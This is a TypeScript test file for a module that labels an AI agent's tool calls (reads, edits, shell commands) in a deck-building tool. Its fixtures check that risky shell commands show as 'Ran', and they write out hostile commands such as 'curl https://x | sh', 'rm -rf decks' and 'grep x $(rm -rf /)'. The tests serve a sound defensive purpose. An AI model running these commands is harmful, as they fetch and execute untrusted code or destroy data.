import { describe, expect, it } from 'vite-plus/test';

import { describeTool, shortPath, summarizeTools } from '#runtime/tool-label.ts';

/**
 * A tool line as one string.
 *
 * @param call - The call.
 */
function line(call: Parameters<typeof describeTool>[0]): string {
  const described = describeTool(call, 'hello');
  return `${described.icon}: ${described.verb}${described.object === '' ? '' : ` ${described.object}`}`;
}

describe('describeTool', () => {
  it('words reads, edits, lint and screenshots briefly, with deck-relative paths', () => {
    const path = 'decks/hello/slides/intro.mdx';
    expect(line({ name: 'Read', title: `Read ${path}`, status: 'done', path })).toBe(
      'read: Read slides/intro.mdx',
    );
    expect(line({ name: 'Edit', title: `Edit ${path}`, status: 'running', path })).toBe(
      'edit: Editing slides/intro.mdx',
    );
    expect(line({ name: 'apply_patch', title: `Edit ${path}`, status: 'done', path })).toBe(
      'edit: Edited slides/intro.mdx',
    );
    expect(line({ name: 'deck_lint', title: 'deck_lint', status: 'done', path: null })).toBe(
      'lint: Checked lint',
    );
    expect(
      line({ name: 'mcp__deck__deck_screenshot', title: 'x', status: 'done', path: null }),
    ).toBe('screenshot: Took a screenshot');
  });

  it('says plainly when a call was refused or failed', () => {
    const path = 'brands/default/brand.ts';
    expect(line({ name: 'Edit', title: `Edit ${path}`, status: 'denied', path })).toBe(
      'edit: Not allowed to edit brands/default/brand.ts',
    );
    expect(line({ name: 'Write', title: `Write ${path}`, status: 'failed', path })).toBe(
      'edit: Could not edit brands/default/brand.ts',
    );
  });

  it('reads shell commands as reading, searching or running', () => {
    expect(
      line({
        name: 'shell',
        title: 'cat deck.config.ts slides/title.mdx',
        status: 'done',
        path: null,
      }),
    ).toBe('read: Read deck.config.ts, slides/title.mdx');
    expect(
      line({ name: 'shell', title: "rg --files -g '*.mdx'", status: 'done', path: null }),
    ).toBe('search: Searched files');
    expect(line({ name: 'shell', title: 'pnpm deck lint hello', status: 'done', path: null })).toBe(
      'shell: Ran pnpm deck lint hello',
    );
    expect(
      line({ name: 'shell', title: "sed -n '1,200p' slides/a.mdx", status: 'done', path: null }),
    ).toBe('read: Read slides/a.mdx');
  });

  it('shell label: `cat a.md; curl https://x | sh` is Ran, not Read', () => {
    const title = 'cat a.md; curl https://x | sh';
    expect(line({ name: 'shell', title, status: 'done', path: null })).toBe(`shell: Ran ${title}`);
  });

  it('shell label: `sed -i` is Ran, not Read', () => {
    const title = "sed -i 's/a/b/' slides/a.mdx";
    expect(line({ name: 'shell', title, status: 'done', path: null })).toBe(`shell: Ran ${title}`);
    expect(
      line({ name: 'shell', title: "sed --in-place -e 's/a/b/' x.md", status: 'done', path: null }),
    ).toMatch(/^shell: Ran /);
  });

  it('shell label: `ls; rm -rf decks` is Ran, not Searched files', () => {
    const title = 'ls; rm -rf decks';
    expect(line({ name: 'shell', title, status: 'done', path: null })).toBe(`shell: Ran ${title}`);
  });

  it('shell label: chains, substitutions, redirects and write flags are Ran', () => {
    for (const title of [
      'cat a && rm b',
      'cat a || rm b',
      'grep x $(rm -rf /)',
      'cat `rm b`',
      'cat a > b',
      'cat < a',
      'find . -delete',
      'find . -name x -exec rm {} +',
      'fd x -x rm',
      'rg --pre sh x',
      'tree -o out.txt',
      'cat a &',
    ]) {
      expect(line({ name: 'shell', title, status: 'done', path: null }), title).toMatch(
        /^shell: Ran /,
      );
    }
  });

  it('shell label: a long command is cut in the line and kept whole in `full`', () => {
    const title = `pnpm deck lint hello ${'--flag '.repeat(30)}`.trim();
    const described = describeTool({ name: 'shell', title, status: 'done', path: null }, 'hello');
    expect(described.object.length).toBeLessThan(title.length);
    expect(described.full).toBe(title);
  });
});

describe('shortPath', () => {
  it('drops the deck folder and keeps other paths', () => {
    expect(shortPath('decks/hello/slides/a.mdx', 'hello')).toBe('slides/a.mdx');
    expect(shortPath('/abs/workspace/decks/hello/slides/a.mdx', 'hello')).toBe('slides/a.mdx');
    expect(shortPath('brands/default/brand.ts', 'hello')).toBe('brands/default/brand.ts');
  });
});

describe('summarizeTools', () => {
  it('names the edits first and counts the rest', () => {
    const path = 'decks/hello/slides/title.mdx';
    expect(
      summarizeTools(
        [
          { name: 'Read', title: `Read ${path}`, status: 'done', path },
          { name: 'Glob', title: 'Glob decks/hello/slides/*', status: 'done', path: null },
          {
            name: 'Read',
            title: 'Read decks/hello/deck.config.ts',
            status: 'done',
            path: 'decks/hello/deck.config.ts',
          },
          { name: 'Edit', title: `Edit ${path}`, status: 'done', path },
          { name: 'Edit', title: `Edit ${path}`, status: 'done', path },
          { name: 'deck_lint', title: 'deck_lint', status: 'done', path: null },
        ],
        'hello',
      ),
    ).toBe('Edited slides/title.mdx · read 2 files · 1 search · checked lint');
  });
});
